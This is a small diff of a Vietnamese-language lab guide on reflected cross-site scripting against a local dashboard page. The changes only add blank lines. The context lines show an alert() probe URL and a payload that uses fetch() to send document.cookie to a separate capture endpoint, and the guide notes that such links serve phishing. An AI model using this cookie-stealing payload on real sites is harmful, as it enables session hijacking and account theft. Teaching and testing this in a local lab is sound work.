@@ -194,6 +194,7 @@ Users in system:
 - Sao chép đường dẫn sau vào trình duyệt:
   ```
   http://localhost:8080/dashboard.php?search=<script>alert('XSS')</script>
+  
   ```
 
 **Bước 2: Truy Cập URL**
@@ -203,6 +204,7 @@ Users in system:
 **Bước 3: URL Phức Tạp Hơn (Capture Cookie)**
   ```
   http://localhost:8080/dashboard.php?search=<script>fetch("http://localhost:8082/capture.php?cookie="+document.cookie);</script>
+  
   ```
 
 **Lưu Ý:** Loại tấn công này thường được sử dụng trong **phishing** để lure người dùng click vào link độc hại.
